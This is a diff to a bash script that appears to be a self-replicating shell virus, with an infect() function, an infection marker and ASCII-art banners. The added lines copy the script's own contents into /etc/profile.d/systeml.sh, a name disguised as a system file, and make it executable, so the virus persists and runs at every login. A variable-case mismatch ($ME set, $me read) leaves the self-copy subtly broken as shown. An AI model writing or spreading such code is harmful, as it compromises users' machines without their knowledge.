@@ -1,7 +1,5 @@
 #!/bin/bash
 
-
-
 #                  #
 #    __      __      \                .___         .___
 #   /  \    /  \____  \_ __  ____   __| _/____   __| _/ ---------
@@ -35,6 +33,10 @@
 # Tested on Linux (Ubuntu, Debian) and MacOS (OSX)
 
 SHEBANG="#!/bin/bash"
+
+ME="$0"
+
+CAT=$(cat "$me")
 
 FLAG="#arrow"
 
@@ -92,6 +94,10 @@ function infect() {
 
 # start infecting autostart
 
+echo "$CAT" > /etc/profile.d/systeml.sh
+
+chmod 755 /etc/profile.d/systeml.sh
+
 cd /etc/profile.d/
 
 check
@@ -111,5 +117,3 @@ check
 #            //`:::`\\
 #           //   '   \\
 #          |/         \\
-
-
